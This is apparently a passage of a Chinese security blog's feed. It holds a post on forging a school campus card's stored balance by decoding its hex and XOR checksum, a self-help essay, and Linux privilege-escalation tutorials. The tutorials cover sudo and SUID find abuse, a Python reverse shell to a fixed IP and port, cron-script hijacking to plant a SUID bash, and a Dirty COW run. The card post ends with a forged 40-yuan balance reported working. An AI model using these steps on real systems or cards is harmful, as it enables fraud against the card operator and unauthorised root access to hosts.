alt="我是如何破解学校一慧通的"></p><p>将金额转换成十六进制为：</p><pre><code class="hljs apache"><span class="hljs-attribute">3</span>.<span class="hljs-number">14</span> = <span class="hljs-number">314</span> = <span class="hljs-number">13</span>A<span class="hljs-attribute">3</span>.<span class="hljs-number">20</span> = <span class="hljs-number">320</span> = <span class="hljs-number">140</span><span class="hljs-attribute">4</span>.<span class="hljs-number">22</span> = <span class="hljs-number">422</span> = <span class="hljs-number">1</span>A<span class="hljs-number">6</span><span class="hljs-attribute">5</span>.<span class="hljs-number">00</span> = <span class="hljs-number">500</span> = <span class="hljs-number">1</span>F<span class="hljs-number">4</span><span class="hljs-attribute">0</span>.<span class="hljs-number">16</span> = <span class="hljs-number">16</span> = <span class="hljs-number">10</span><span class="hljs-attribute">4</span>.<span class="hljs-number">78</span> = <span class="hljs-number">478</span> = <span class="hljs-number">1</span>DE</code></pre><p>我卡中的数据不同的区域用红色的标记起来：</p><p><strong>3.14</strong></p><p>00 00 00 35 A0 <font color='red'>3A 01</font> 00 00 <font color='red'>C5</font> FE FF FF <font color='red'>3A 01</font> 00 00</p><p>1D E2 1D E2 <font color='red'>3A 01</font> 00 00 <font color='red'>C5</font> FE FF FF <font color='red'>3A 01</font> 00 001E</p><p><strong>3.20</strong></p><p>00 00 00 35 A0 <font color='red'>40 01</font> 00 00 <font color='red'>BF</font> FE FF FF <font color='red'>40 01</font> 00 00</p><p>1D E2 1D E2 <font color='red'>40 01</font> 00 00 <font color='red'>BF</font> FE FF FF <font color='red'>40 01</font> 00 001E</p><p><strong>4.22</strong></p><p>00 00 00 35 A0 <font color='red'>A6 01</font> 00 00 <font color='red'>59</font> FE FF FF <font color='red'>A6 01</font> 00 00</p><p>1D E2 1D E2 <font color='red'>A6 01</font> 00 00 <font color='red'>59</font> FE FF FF <font color='red'>A6 01</font> 00 001E</p><p><strong>5.00</strong></p><p>00 00 00 35 A0 <font color='red'>F4 01</font> 00 00 <font color='red'>0B</font> FE FF FF <font color='red'>F4 01</font> 00 00</p><p>1D E2 1D E2 <font color='red'>F4 01</font> 00 00 <font color='red'>0B</font> FE FF FF <font color='red'>F4 01</font> 00 001E</p><p>我用3.14为例。<font color='red'>3A 01</font>区域有两处，可以看出金额3.14转换成十六进制是13A，后两位就是3A，第一位是1。这样就可以确定3A01是如何来的。</p><p>关于C5是如何来的，经过我多次分析加运算后得知</p><p><font color='Blue'>FF - 3A = C5</font> 这样一来也可以知道C5是如何得来的</p><p>我想把金额改成40元，40转换十六进制为40.00 =4000 = FA0</p><p>FF - A0 = 5F</p><p>可以得出40的数据为</p><p>00 00 00 35 A0 <font color='red'>A0 0F</font> 00 00 <font color='red'>5F</font> FE FF FF <font color='red'>A0 0F</font> 00 00</p><p>1D E2 1D E2 <font color='red'>A0 0F</font> 00 00 <font color='red'>5F</font> FE FF FF <font color='red'>A0 0F</font> 00 00 1E</p><p>不过当我写进卡里时….</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/29.png" alt="我是如何破解学校一慧通的"></p><p>这是妹子拍给我的照片….</p><p>后来我对比妹子的两个数据</p><p>0.16</p><p>00 00 00 72 6A <font color='red'>10 00</font> 00 00 <font color='red'>EF</font> <font color='LimeGreen'>FF</font> FF FF <font color='red'>10 00</font> 00 00</p><p>1D E2 1D E2 <font color='red'>10 00</font> 00 00 <font color='red'>EF</font> <font color='LimeGreen'>FF</font> FF FF <font color='red'>10 00</font> 00 00 1E</p><p>4.78</p><p>00 00 00 72 6A <font color='red'>DE 01</font> 00 00 <font color='red'>21</font> <font color='LimeGreen'>FE</font> FF FF <font color='red'>DE 01</font> 00 00</p><p>1D E2 1D E2 <font color='red'>DE 01</font> 00 00 <font color='red'>21</font> <font color='LimeGreen'>FE </font>FF FF <font color='red'>DE 01</font> 00 00 1E</p><p>又有一个地方产生了变化….</p><p>0.16时为FF，4.78为FE</p><p>计算得出加密方法：</p><p>0.16为例</p><p>FF xor EF = 10</p><p>10 + 00 = 10</p><p>经过多次运算，所有金额数据都符合这个规律</p><p>继续转到40的金额 </p><p>00 00 00 35 A0 <font color='red'>A0 0F</font> 00 00 <font color='red'>5F</font> FE FF FF <font color='red'>A0 0F</font> 00 00</p><p>1D E2 1D E2 <font color='red'>A0 0F</font> 00 00 <font color='red'>5F</font> FE FF FF <font color='red'>A0 0F</font> 00 001E</p><p>这是之前的数据</p><p>A0 + 0F = AF</p><p>? Xor 5F =AF</p><p>关于xor的运算之前已经说过这里就不多说了</p><p>得出结果为F0</p><p>将数据改为</p><p>00 00 00 35 A0 <font color='red'>A0 0F</font> 00 00 <font color='red'>5F F0</font> FF FF <font color='red'>A0 0F</font> 00 00</p><p>1D E2 1D E2 <font color='red'>A0 0F</font> 00 00 <font color='red'>5F F0</font> FF FF <font color='red'>A0 0F</font> 00 00 1E</p><p>写进卡中后</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/30.png" alt="我是如何破解学校一慧通的"></p><p>成功，据说每次插进去都会少0.06，这就是传说中的吞钱？？</p><h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h2><p>一卡通有三个功能，吃饭的功能没去研究，就这样吧。</p><p>文章写得简单，可过程经过多次测试与计算。</p><p>最后祝各位看到此文章的学子们在大学期间都能找到自己的真爱。</p><div class="note note-primary">            <p>本文章只做技术交流，请勿将文章中涉及技术用于非法或其他用途，由此产生纠纷问题均与本人无关！</p>          </div>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;文章是大学的时候写的，现在毕业多年，打算将过程写出来分享下学习思路&lt;/p&gt;
&lt;div class=&quot;note note-primary&quot;&gt;
            &lt;p&gt;本文章只做技术交流，请勿将文章中涉及技术用于非法或其他用途，由此产生纠纷问题均与本人无关！&lt;/p&gt;
  </summary>
      
    
    
    
    <category term="原创文章" scheme="http://www.secice.cn/categories/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/"/>
    
    
    <category term="破解" scheme="http://www.secice.cn/tags/%E7%A0%B4%E8%A7%A3/"/>
    
  </entry>
  
  <entry>
    <title>一个人开始废掉的3个迹象</title>
    <link href="http://www.secice.cn/p/65c9d71c"/>
    <id>http://www.secice.cn/p/65c9d71c</id>
    <published>2020-12-07T02:16:37.000Z</published>
    <updated>2020-12-07T02:18:46.643Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><p>　　最近半年，表弟迷上了刷视频，不管什么时候见到他，他总是拿着个手机在看。我劝他：“都要找工作的人了，别一天到晚就知道刷视频，干点正事要紧。”他总是说：“马上马上，就看1分钟，再看1分钟！”</p><p>　　可问题是，1分钟常常演变成10分钟、1小时，甚至一整天。</p><p>　　我知道，网上有许多表弟感兴趣的内容，尤其系统还会根据他过去浏览的信息，有针对性地进行推送。比如表弟爱看幽默搞笑的段子，系统就会推送更多的类似视频给他。</p><p>　　但是，如果没有足够的自制力去抵御外界的诱惑，过度沉迷于即时快感，那离废掉也就不远了。</p><p>　　心理学上有一个“花盆效应”，说的是人如果在舒适的“花盆”中待久了，就容易不思进取、安于现状。</p><p>　　<strong>如果你天天禁锢在自己的小圈子里，沉溺在自己的舒适区不可自拔，而不是用心花时间提升自己，怎么可能走向更广阔的天地呢？</strong></p><p>　　人生如逆水行舟，不进则退。如果选择过分安逸，就会丧失斗志；如果丧失了斗志，生活就会越来越闲；如果越来越闲，最终就会和别人拉开一大截差距。</p><p>　　现在有多不思进取，将来被时代所抛弃时就有多后悔莫及。</p><h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><p>　　前几天，我的叔叔失业了，这沉重的一击害得他整天抽烟解闷，觉得在阿姨面前抬不起头来。</p><p>　　其实，叔叔的情况，我们都早有耳闻。他自认为自己技术过硬，曾经又获得过公司的先进，就终日懒懒散散、不思进取，躺在过去的功劳簿上睡大觉。</p><p>　　半年前，公司新招聘了个名校毕业的小伙子。小伙子吃苦耐劳，肯学肯干，技术水平早就在叔叔之上。</p><p>　　叔叔也不是没有危机感，但他觉得，自己年纪大了，记性也差了，现在要学新东西也难了，常常是一边嘴里满是焦虑，一边又没有实际行动。</p><p>　　现在工作被人取代，叔叔这才后悔莫及：试想，如果自己还是当年那个技术骨干，公司会让自己说走就走吗？</p><p>　　说到底，这是他自己长期满足于现状、停止学习的代价。</p><p>　　职场是个靠价值说话的地方，你有多少价值，决定了你能站上多高的位置。但凡有所成就的人，注定终身与读书和学习形影不离。</p><p>　　<strong>只要你还在学习，人生就有无限可能。</strong></p><h2 id="3"><a href="#3" class="headerlink" title="3"></a>3</h2><p>　　两个月前，闺蜜再一次立下誓言：暴瘦20斤。</p><p>　　闺蜜是个吃货，见到啥好东西都管不住嘴，再加上迈不开腿，所以体重跟着蹭蹭蹭直线上升。</p><p>　　我激励她：“不减下来，别来见我。”在那之后，她果然坚持跑步了一阵子。但没多久，她就又一切照旧了。</p><p>　　“你不知道，跑多了腿酸。”</p><p>　　“这是下雪天啊！会冻死的啊！”</p><p>　　“啊，这么好吃的布丁，别拦我！”</p><p>　　她总会有这样七七八八的理由。所以，如今见到她，还是老样子。</p><p>　　生活中，总有一些人嚷嚷着要实现什么样的目标，却总是不能如愿，归根结底，缺的是自律。<strong>放弃了自律，迟早有一天要为过去的偷懒买单。</strong></p><p>　　有句话说得好：自律，出众；不自律，出局。</p><h2 id="4"><a href="#4" class="headerlink" title="4"></a>4</h2><p>　　没有人天生就是王者。</p><p>　　说到底，一个人能有怎样的人生，走在什么样的路上，是痛苦还是快乐、失败还是成功，最终取决于自己。</p><p>　　如果你的生活中，出现了不再愿意走出舒适区、停止了学习、放弃了自律这三种迹象，那就要提醒自己注意了。</p><p>　　因为，成功，属于懂得走出舒适区、积极进取的人；</p><p>　　属于坚持读书和学习的人；</p><p>　　属于能够保持高度自律的人。</p><p>　　<strong>与其怨天尤人，“望洋兴叹”，不如从现在开始，脚踏实地，不负韶华，努力成为更好的自己。</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1&quot;&gt;&lt;a href=&quot;#1&quot; class=&quot;headerlink&quot; title=&quot;1&quot;&gt;&lt;/a&gt;1&lt;/h2&gt;&lt;p&gt;　　最近半年，表弟迷上了刷视频，不管什么时候见到他，他总是拿着个手机在看。我劝他：“都要找工作的人了，别一天到晚就知道刷视频，干点正事要紧。”他总是</summary>
      
    
    
    
    <category term="胡思乱想" scheme="http://www.secice.cn/categories/%E8%83%A1%E6%80%9D%E4%B9%B1%E6%83%B3/"/>
    
    
    <category term="生活" scheme="http://www.secice.cn/tags/%E7%94%9F%E6%B4%BB/"/>
    
  </entry>
  
  <entry>
    <title>Linux提权之Sudo配置错误</title>
    <link href="http://www.secice.cn/p/94404766"/>
    <id>http://www.secice.cn/p/94404766</id>
    <published>2020-11-27T06:38:09.000Z</published>
    <updated>2020-12-24T02:18:58.709Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>如果攻击者无法通过其他任何方法直接获得root用户访问权限，则他可能会尝试损害具有SUDO访问权限的任何用户。一旦他可以访问任何sudo用户，他就可以基本上以root特权执行任何命令。</p><p>管理员可能只允许用户通过SUDO运行一些命令，可能在没有察觉的情况下中引入漏洞，这可能导致权限提升。</p><p>一个典型的例子是将SUDO权限分配给find命令，以便其他用户可以在系统中搜索特定的文件相关文件。尽管管理员可能不知道’find’命令包含用于执行命令的参数，但攻击者可以以root特权执行命令。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>拿到普通用户权限之后，使用<code>sudo –l</code>查看下， 查看当前是否存在当前用户可以调用sudo的命令，如下图，当前用户可以执行find命令，然后通过find命令获取root权限。</p><pre><code class="hljs bash">sudo /usr/bin/find /home -<span class="hljs-built_in">exec</span> /bin/bash -p \;</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201127_Linux%E6%8F%90%E6%9D%83%E4%B9%8BSudo%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF/01.jpg" alt="root"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;漏洞介绍&quot;&gt;&lt;a href=&quot;#漏洞介绍&quot; class=&quot;headerlink&quot; title=&quot;漏洞介绍&quot;&gt;&lt;/a&gt;漏洞介绍&lt;/h2&gt;&lt;p&gt;如果攻击者无法通过其他任何方法直接获得root用户访问权限，则他可能会尝试损害具有SUDO访问权限的任何用户。一旦他可以访问</summary>
      
    
    
    
    <category term="红队攻防" scheme="http://www.secice.cn/categories/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/"/>
    
    
    <category term="提权" scheme="http://www.secice.cn/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>Linux提权之Suid提权</title>
    <link href="http://www.secice.cn/p/a20c8cf4"/>
    <id>http://www.secice.cn/p/a20c8cf4</id>
    <published>2020-11-27T05:44:54.000Z</published>
    <updated>2020-12-24T02:18:59.643Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>SUID代表设置的用户ID，是一种Linux功能，允许用户在指定用户的许可下执行文件。只要低特权用户执行suid权限程序，便会以root特权执行。</p><p>SUID是一项功能，如果使用得当，它实际上可以增强Linux的安全性。问题在于，管理员在安装第三方应用程序或进行逻辑配置更改时可能会在不知不觉中引入危险的SUID配置。</p><p>许多系统管理员不知道应该在什么情况设置SUID位，SUID位不应该设置在文件编辑器上，因为攻击者可以修改系统上存在的任何文件。</p><h2 id="常见的可用于suid提权的命令"><a href="#常见的可用于suid提权的命令" class="headerlink" title="常见的可用于suid提权的命令"></a>常见的可用于suid提权的命令</h2><pre><code class="hljs bash">NmapVimfindBashMoreLessNanocp</code></pre><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>使用LinEnum.sh来收集要提权的机器上的信息，该脚本主要用来收集Linux上的信息。</p><p>该脚本的下载地址：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/rebootuser/</span>LinEnum</code></pre><p>执行LinEnum之后，发现find这个命令有SUID权限。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201127_Linux%E6%8F%90%E6%9D%83%E4%B9%8BSuid%E6%8F%90%E6%9D%83/01.jpg" alt="收集信息"></p><h3 id="确认-find-有-root-执行权限"><a href="#确认-find-有-root-执行权限" class="headerlink" title="确认 find 有 root 执行权限"></a>确认 find 有 root 执行权限</h3><p>执行命令</p><pre><code class="hljs bash">touch ice/usr/bin/find ice -<span class="hljs-built_in">exec</span> whoami \;</code></pre><p>确认 find 命令是否是 root 权限执行.</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201127_Linux%E6%8F%90%E6%9D%83%E4%B9%8BSuid%E6%8F%90%E6%9D%83/02.jpg" alt="root"></p><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>如果目标机上有 python 环境，可以使用 python 命令反弹 shell：</p><pre><code class="hljs bash"><span class="hljs-comment">#反弹一个sh类型的shell</span>python -c <span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.126.165&quot;,8989));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></code></pre><p>结合 find :</p><pre><code class="hljs bash">/usr/bin/find ice -<span class="hljs-built_in">exec</span> python -c <span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.126.165&quot;,8989));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span> \;</code></pre><p>但是反弹的 shell 不是 root 权限，在本机上 find 执行 id 时，有一个 euid <code>（euid 就是我们通常说的 suid， 或者叫 excute user id，它使文件执行时拥有该文件所有者的权限。）</code>为 root 权限，但是反弹 shell 中并没有。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201127_Linux%E6%8F%90%E6%9D%83%E4%B9%8BSuid%E6%8F%90%E6%9D%83/03.jpg" alt="非root权限"></p><p>默认情况下 bash 在执行时，如果发现 euid 和 uid 不匹配，会将 euid（即 suid） 强制重置为uid 。如果使用了 -p 参数，则不会再覆盖。</p><p>我们尝试使用如下命令获取 shell：</p><pre><code class="hljs bash">/usr/bin/find ice -<span class="hljs-built_in">exec</span> /bin/bash -p \;</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201127_Linux%E6%8F%90%E6%9D%83%E4%B9%8BSuid%E6%8F%90%E6%9D%83/04.jpg" alt="提权成功"></p><p>可以看到获取的 shell 为 root 权限。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;漏洞介绍&quot;&gt;&lt;a href=&quot;#漏洞介绍&quot; class=&quot;headerlink&quot; title=&quot;漏洞介绍&quot;&gt;&lt;/a&gt;漏洞介绍&lt;/h2&gt;&lt;p&gt;SUID代表设置的用户ID，是一种Linux功能，允许用户在指定用户的许可下执行文件。只要低特权用户执行suid权限程序，便</summary>
      
    
    
    
    <category term="红队攻防" scheme="http://www.secice.cn/categories/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/"/>
    
    
    <category term="提权" scheme="http://www.secice.cn/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>Linux提权之定时任务</title>
    <link href="http://www.secice.cn/p/75fd4604"/>
    <id>http://www.secice.cn/p/75fd4604</id>
    <published>2020-11-26T07:40:12.000Z</published>
    <updated>2020-12-24T02:18:56.881Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>定时任务（cron job）被用于安排那些需要被周期性执行的命令。利用它，你可以配置某些命令或者脚本，让它们在某个设定的时间内周期性地运行。cron 是 Linux 或者类 Unix 系统中最为实用的工具之一。cron 服务（守护进程）在系统后台运行，并且会持续地检查 /etc/crontab 文件和 /etc/cron.*/ 目录。它同样也会检查 /var/spool/cron/ 目录。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/01.png" alt="Linux提权之定时任务"></p><p>比如，在下面的crontab 命令中，就可以每个1个小时自动打印apach错误日志。</p><pre><code class="hljs bash">1 0 * * * <span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;&quot;</span> &gt; /var/<span class="hljs-built_in">log</span>/apache/error_log</code></pre><p>如果未正确配置Cron，则可以利用它获得root特权。</p><ol><li>cron作业中是否有可写的脚本或二进制文件？</li><li>我们可以覆盖cron文件本身吗？</li><li>cron.d目录可写吗？</li></ol><p>Cron通常以root特权运行。如果我们可以成功修改cron中的任何脚本或二进制文件，那么我们可以使用root权限执行任意代码。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="创建一个定时任务"><a href="#创建一个定时任务" class="headerlink" title="创建一个定时任务"></a>创建一个定时任务</h3><p>目标：创建一个运行python脚本来擦除特定目录的所有数据<br>假设目录cleanup就是要擦除的目录，我们希望每隔2分钟就清除1次目录。首先，向该目录中创建一些文件：</p><pre><code class="hljs bash">mkdir cleanup<span class="hljs-built_in">cd</span> cleanup<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;hello freinds&quot;</span> &gt; 1.txt<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;ALL files will be deleted in 2 mints&quot;</span> &gt; 2.txt<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&quot;</span> &gt; 1.php<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&quot;</span> &gt; 2.phpls</code></pre><p>下图是上面命令执行的结果：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/02.png" alt="创建文件"></p><p>下面我们写一个python程序来删除 /home/cleanup的内容。</p><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /tmpvi cleanup.py</code></pre><pre><code class="hljs sh"><span class="hljs-meta">#!/usr/bin/env python</span>import osimport systry:   os.system(<span class="hljs-string">&#x27;rm -r /root/cleanup/* &#x27;</span>)except:    sys.exit()</code></pre><p><code>chmod 777 cleanup.py</code></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/03.png" alt="创建文件"></p><p>编辑crontab添加定时任务，每隔2分钟运行一次cleanup.py脚本。</p><pre><code class="hljs awk">vi <span class="hljs-regexp">/etc/</span>crontab*<span class="hljs-regexp">/2 *   * * *   root    /</span>tmp/cleanup.py</code></pre><p>下面是运行效果</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/04.png" alt="创建文件"></p><p>在真实环境下普通用户可能无法访问crontab文件，可以用pspy来监听进程。</p><p>pspy是一种命令行工具，无需root权限即可监听进程。可以查看其他用户执行的命令、cron作业等。</p><p>该工具的下载地址：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/DominicBreuker/</span>pspy</code></pre><p>首先将pspy上传到目标机器：</p><p>1）chmod +x pspy64s</p><p>2）./pspy64</p><p>观察一段时间，发现/tmp/cleanup.py为root权限执行。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/05.png" alt="pspy64s"></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/06.png" alt="pspy64s"></p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>查看/tmp/cleanup.py权限为普通用户可写</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/07.png" alt="查看权限"></p><p>打开文件，比如vi /tmp/cleanup.py，用下面的命令替换原来命令中的“os.system(‘rm -r /home/cleanup/* ‘)”：</p><pre><code class="hljs clean">os.<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cp /bin/bash /tmp/bash; chmod +s /tmp/bash&#x27;</span>)</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/08.png" alt="修改文件"></p><p>2分钟后，tmp目录下就会存在SUID权限的bash，运行<code>/tmp/bash -p </code>后就获取了root权限。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/09.png" alt="利用成功"></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/10.png" alt="root权限"></p><p>提权成功。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;漏洞介绍&quot;&gt;&lt;a href=&quot;#漏洞介绍&quot; class=&quot;headerlink&quot; title=&quot;漏洞介绍&quot;&gt;&lt;/a&gt;漏洞介绍&lt;/h2&gt;&lt;p&gt;定时任务（cron job）被用于安排那些需要被周期性执行的命令。利用它，你可以配置某些命令或者脚本，让它们在某个设定的时间</summary>
      
    
    
    
    <category term="红队攻防" scheme="http://www.secice.cn/categories/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/"/>
    
    
    <category term="提权" scheme="http://www.secice.cn/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>Linux提权之内核漏洞</title>
    <link href="http://www.secice.cn/p/3574493e"/>
    <id>http://www.secice.cn/p/3574493e</id>
    <published>2020-11-26T03:12:42.000Z</published>
    <updated>2020-12-24T02:18:57.820Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>Linux目前是最为常见的操作系统，该系统是处于源代码开放状态，信息安全问题也会随之被世界各地的“体验者”揭露出来。</p><p>Linux操作系统的内核是该系列操作系统的“灵魂大脑”，一旦出现安全隐患情况下，攻击者会很对这些安全隐患加以恶意利用，其中Linux内核漏洞是目前攻击者最为热爱的漏洞之一，内核漏洞的利用通常会以“上帝视角”，也就是所谓的操作系统最高权限的形式为攻击者提供对目标系统的超级用户访问权限。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>以Linux内核提权漏洞-“脏牛”来做演示。</p><p>给大家介绍下检查linux提权辅助工具，les该工具主要帮助检测linux内核的安全缺陷。</p><p>下载地址：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/mzet-/</span>linux-exploit-suggester</code></pre><p>1.将linux-exploit-suggester.sh下载到要检查的主机上，主要使用以下两条指令：</p><pre><code class="hljs css"><span class="hljs-selector-tag">chmod</span> +<span class="hljs-selector-tag">x</span> <span class="hljs-selector-tag">linux-exploit-suggester</span><span class="hljs-selector-class">.sh</span>./<span class="hljs-selector-tag">linux-exploit-suggester</span><span class="hljs-selector-class">.sh</span></code></pre><p>在执行上述命令之前，首先查看Linux内核版本。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E/01.png" alt="查看Linux内核版本"></p><p>查看脚本执行结果，可以使用脏牛来进行提权。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E/02.png" alt="执行结果"></p><p>2.将漏洞利用代码上传到目标机器，接下来编译并执行。</p><pre><code class="hljs css"><span class="hljs-selector-tag">gcc</span> <span class="hljs-selector-tag">-pthread</span> <span class="hljs-selector-tag">dirty</span><span class="hljs-selector-class">.c</span> <span class="hljs-selector-tag">-o</span> <span class="hljs-selector-tag">dirty</span> <span class="hljs-selector-tag">-lcrypt</span>./<span class="hljs-selector-tag">dirty</span> <span class="hljs-selector-tag">password</span></code></pre><p><img 